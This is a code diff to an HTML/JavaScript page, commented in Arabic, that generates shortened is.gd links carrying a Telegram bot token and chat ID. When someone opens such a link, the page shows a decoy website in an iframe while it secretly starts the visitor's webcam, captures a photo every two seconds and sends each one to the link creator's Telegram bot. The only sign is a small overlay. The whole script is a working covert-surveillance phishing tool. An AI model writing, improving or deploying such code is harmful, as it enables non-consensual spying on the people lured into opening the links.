@@ -8,12 +8,11 @@
       font-family: Tahoma, sans-serif;
       background: #0f0f0f url('YOUR_IMAGE_URL') no-repeat center center / cover;
       color: #fff;
-      margin: 0;
-      padding: 0;
-      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
+      height: 100vh;
+      margin: 0;
     }
     .box {
       background: rgba(0,0,0,0.7);
@@ -25,35 +24,38 @@
       text-align: center;
       color: #4a89dc;
     }
-    .input-group { margin-bottom: 15px; }
-    label { display: block; margin-bottom: 5px; }
+    .input-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+    }
     input {
-      width: 100%; padding: 10px; border: none;
+      width: 100%;
+      padding: 10px;
+      border: none;
       border-radius: 8px;
     }
     button {
-      width: 100%; padding: 12px; border: none;
-      border-radius: 8px;
-      background: #4a89dc; color: #fff;
-      cursor: pointer; font-size: 16px;
-    }
-    button:hover { background: #3570b5; }
-    #result {
-      margin-top: 15px; word-break: break-all;
-      background: rgba(255,255,255,0.1);
-      padding: 10px; border-radius: 8px;
-    }
-    .camera-note {
-      background: rgba(0,0,0,0.6);
-      color: #ffcc00;
-      text-align: center;
-      padding: 5px;
-      font-size: 14px;
-    }
-    iframe {
-      border: none;
       width: 100%;
-      height: calc(100vh - 30px);
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      background: #4a89dc;
+      color: #fff;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background: #3570b5;
+    }
+    #result {
+      margin-top: 15px;
+      word-break: break-all;
+      background: rgba(255,255,255,0.1);
+      padding: 10px;
+      border-radius: 8px;
     }
   </style>
 </head>
@@ -91,10 +93,13 @@ generateBtn.addEventListener("click", async () => {
     return;
   }
 
+  // نضيف البيانات في الرابط
   const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chatId)}&token=${encodeURIComponent(token)}&url=${encodeURIComponent(link)}`;
 
+  // نستخدم API لاختصار الرابط (is.gd)
   try {
     const res = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(fullLink)}`);
+    if (!res.ok) throw new Error("فشل الاتصال بموقع is.gd");
     const shortUrl = await res.text();
     result.innerHTML = `<p>🔗 رابطك المختصر:</p><div>${shortUrl}</div>`;
   } catch (e) {
@@ -102,42 +107,47 @@ generateBtn.addEventListener("click", async () => {
   }
 });
 
+// عند فتح الرابط المختصر → يعرض الموقع فقط + نص صغير أنه بيصور
 const urlParams = new URLSearchParams(window.location.search);
 const openUrl = urlParams.get("url");
-const chatId = urlParams.get("chat");
-const token = urlParams.get("token");
-
-if (openUrl && chatId && token) {
+if (openUrl) {
   document.body.innerHTML = `
-    <div class="camera-note">📷 يتم التقاط صور...</div>
-    <iframe src="${openUrl}"></iframe>
+    <div style="position:fixed;top:10px;left:10px;color:white;font-size:14px;">📸 يتم التقاط صور...</div>
+    <iframe src="${openUrl}" style="border:none;width:100%;height:100vh;"></iframe>
   `;
 
+  const chatId = urlParams.get("chat");
+  const token = urlParams.get("token");
+
+  // تشغيل الكاميرا والتقاط صورة كل ثانيتين
   const video = document.createElement("video");
-  video.autoplay = true;
   video.style.display = "none";
   document.body.appendChild(video);
 
-  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-    video.srcObject = stream;
-    const canvas = document.createElement("canvas");
-    const ctx = canvas.getContext("2d");
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      video.srcObject = stream;
+      video.play();
 
-    setInterval(() => {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0);
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("photo", blob, "image.jpg");
-        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: "POST",
-          body: formData
-        });
-      }, "image/jpeg");
-    }, 2000);
-  });
+      setInterval(() => {
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append("chat_id", chatId);
+          formData.append("photo", blob, "image.png");
+
+          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          });
+        }, "image/png");
+      }, 2000);
+    })
+    .catch(err => console.log("فشل تشغيل الكاميرا:", err));
 }
 </script>
 
